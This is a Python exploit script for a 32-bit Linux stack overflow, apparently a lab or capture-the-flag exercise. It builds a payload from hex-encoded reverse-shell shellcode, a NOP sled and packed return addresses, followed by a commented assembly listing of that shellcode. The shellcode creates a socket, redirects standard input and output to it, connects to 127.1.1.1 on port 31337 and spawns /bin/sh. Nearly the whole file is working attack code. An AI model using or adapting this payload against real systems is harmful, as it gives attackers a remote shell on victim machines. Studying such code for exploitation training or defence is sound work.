from struct import pack
ret_addr = 0xbffed1bc
shellcode_addr = 0xbffec9a8

reverse_shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\xb0\x01\x50\xb0\x02\x50\x31\xdb\xb3\x01\x31\xc0\xb0\x66\x89\xe1\xcd\x80\x89\xc3\x31\xc0\x31\xc9\xb0\x3f\xcd\x80\xfe\xc1\x83\xf9\x02\x75\xf5\x89\xd1\x89\xda\x89\xcb\x68\x7f\x01\x01\x01\x66\x68\x7a\x69\x66\x6a\x02\x6a\x10\x89\xe1\x83\xc1\x04\x51\x52\x89\xe1\x31\xc0\xb0\x66\x31\xdb\xb3\x03\xcd\x80\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

shellcode = reverse_shellcode + "\x90"*(2048-len(reverse_shellcode)) + pack("<I", shellcode_addr) + pack("<I", ret_addr)
print shellcode
"""
  ; REFERENCES to systemcall tables to get id of connect(), socketcall(), dup2(), and execve()
  ; /usr/include/i386-linux-gnu/asm/unistd_32.h.
  ; /usr/include/linux/net.h
  ; https://stackoverflow.com/questions/1817577/what-does-int-0x80-mean-in-assembly-code


global _start

section .text

_start:
;;;;;;;;;;;;;;;;;;;;;;;;;
  ; STAGE1: create socket ;
;;;;;;;;;;;;;;;;;;;;;;;;;
  ; clear registers
  xor eax,eax
  xor ebx,ebx
  xor ecx,ecx
  xor edx, edx

  ; set protocol TCP
  push eax

  ; set type SOCK STREAM
  mov al, 0x01
  push eax

  ; set type INTERNET (AF_INET)
  mov al, 0x02
  push eax

  ; set id of socket() system call
  xor ebx, ebx
  mov bl, 0x01

  ; set id of socketcall() which is 0x66
  xor eax, eax
  mov al, 0x66

  ; set address of the provided information
  ; invoke socketcall()
  mov ecx, esp
  int 0x80


  ; store return result in ebx
  mov ebx, eax

  ; clear register
  xor eax, eax
  xor ecx, ecx

  ; call dup2 2 times to replicate stdin (0) and stdout(1)
loop:
  ; id of dup2() is 0x3f
  mov al, 0x3f
  ; invoke dup2()
  int 0x80
  ; continue for loop
  inc cl
  ; for two times
  cmp ecx, 2
  jne loop

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  ; STAGE 2: connect() using socketcall() ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  ; clear registers
  mov ecx, edx
  mov edx, ebx
  mov ebx, ecx

  ; use 127.1.1.1 which is equivalent to 127.0.0.1
  ; port 31337
  push 0x0101017f
  push word 0x697A

  ; construct socket struct on the stack that has size 0x10 (16 bytes)
  push word 0x02
  push 0x10

  ; push a pointer to the socket struct
  mov ecx, esp
  add ecx, 0x04
  push ecx

  ; push the socket file descriptor (0x00)
  push edx

  ; load address of the pushed informations
  mov ecx, esp

  ; set id of int 0x80 which is socketcall() 0x66
  xor eax, eax
  mov al, 0x66

  ; set id of connect function which is 0x03
  xor ebx, ebx
  mov bl, 0x3

  ; call socketcall() connect()
  int 0x80

;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  ; ; STAGE 3: call execve() ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;

  ; clear registers
  xor eax, eax
  xor ecx, ecx
  xor edx, edx

  ; call execve /bin/sh with NULL parameters
  ; because little endian, first start with a null terminator (edx=0)
  push eax
  push 0x68732f6e
  push 0x69622f2f
  ; load address of bin/sh string to ebx
  mov ebx, esp
  push eax
  mov edx, esp
  push ebx
  mov ecx, esp
  ; instruct that we want to call system call number 0x0b (execve)
  mov al, 0x0b
  int 0x80

"""
